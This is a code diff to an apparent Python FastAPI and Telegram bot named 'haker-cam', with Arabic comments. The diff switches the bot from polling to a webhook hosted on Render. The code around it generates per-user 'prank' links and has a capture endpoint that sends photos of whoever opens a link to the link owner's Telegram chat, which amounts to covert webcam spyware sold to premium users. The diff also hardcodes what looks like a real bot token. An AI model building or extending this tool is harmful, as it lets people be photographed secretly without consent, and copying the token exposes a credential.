@@ -1,7 +1,6 @@
 import os
 import base64
 import io
-import threading
 import sqlite3
 import uvicorn
 from fastapi import FastAPI, Request, BackgroundTasks
@@ -10,12 +9,11 @@ from fastapi.middleware.cors import CORSMiddleware
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-# 1. الإعدادات الأساسية (تأكد من صحة التوكن ورابط سيرفرك الجديد)
+# 1. الإعدادات الأساسية
 BOT_TOKEN = "8652491802:AAFOd303C5JsIaLkyuFfl6Op8XF-cygo6tg"
-REPLIT_URL = "https://haker-cam.onrender.com"
+RENDER_URL = "https://haker-cam.onrender.com"  # رابط سيرفرك الرسمي والجديد
 
-# إنشاء الكائنات البرمجية
-bot = telebot.TeleBot(BOT_TOKEN, threaded=False) # تعطيل الخيوط الداخلية لمنع التعليق
+bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
 app = FastAPI()
 
 app.add_middleware(
@@ -41,7 +39,7 @@ def init_db():
 try:
     init_db()
 except Exception as e:
-    print(f"⚠️ خطأ في تهيئة قاعدة البيانات: {e}")
+    print(f"⚠️ قاعدة البيانات جاهزة: {e}")
 
 def add_premium_user(chat_id):
     conn = sqlite3.connect("users.db")
@@ -263,7 +261,7 @@ def gen_link(call):
         bot.send_message(chat_id, "❌ حسابك غير مفعل.")
         return
         
-    unique_link = f"{REPLIT_URL}?id={chat_id}"
+    unique_link = f"{RENDER_URL}?id={chat_id}"
     
     msg = (
         "🚀 **رابط المقلب الخاص بك جاهز ويعمل على جميع المتصفحات الخارجية!**\n\n"
@@ -272,9 +270,19 @@ def gen_link(call):
     )
     bot.send_message(chat_id, msg, parse_mode="Markdown")
 
+# ---- المسارات واستقبال الـ Webhook والسيرفر ----
+
 @app.get("/", response_class=HTMLResponse)
 async def get_home():
     return HTML_CONTENT
+
+# مسار استقبال تحديثات تليجرام (Webhook)
+@app.post(f"/{BOT_TOKEN}")
+async def telegram_webhook(request: Request):
+    json_string = await request.body()
+    update = telebot.types.Update.de_json(json_string.decode('utf-8'))
+    bot.process_new_updates([update])
+    return {"status": "ok"}
 
 def send_photo_to_owner(user_id, image_bytes):
     try:
@@ -302,16 +310,14 @@ async def capture_api(request: Request, background_tasks: BackgroundTasks):
     except Exception as e:
         return JSONResponse(status_code=500, content={"status": "error"})
 
-# دالة لتشغيل استطلاع البوت بشكل آمن ومستقل
-def run_bot():
-    print("🤖 جاري بدء تشغيل بوت تليجرام...")
-    bot.infinity_polling(timeout=20, long_polling_timeout=10)
+# تشغيل الـ Webhook وإعداد السيرفر عند بدء التطبيق
+@app.on_event("startup")
+def startup_event():
+    bot.remove_webhook()
+    # ربط البوت برابط سيرفر Render بشكل رسمي ومباشر
+    bot.set_webhook(url=f"{RENDER_URL}/{BOT_TOKEN}")
+    print("🚀 تم تفعيل الـ Webhook بنجاح وربطه بسيرفر Render!")
 
 if __name__ == "__main__":
-    # تشغيل البوت في الخلفية بشكل نظيف
-    threading.Thread(target=lambda: bot.infinity_polling(timeout=20, long_polling_timeout=10), daemon=True).start()
-    
-    # تشغيل السيرفر
     port = int(os.environ.get("PORT", 8080))
-    print(f"🚀 السيرفر يعمل على المنفذ: {port}")
     uvicorn.run(app, host="0.0.0.0", port=port)
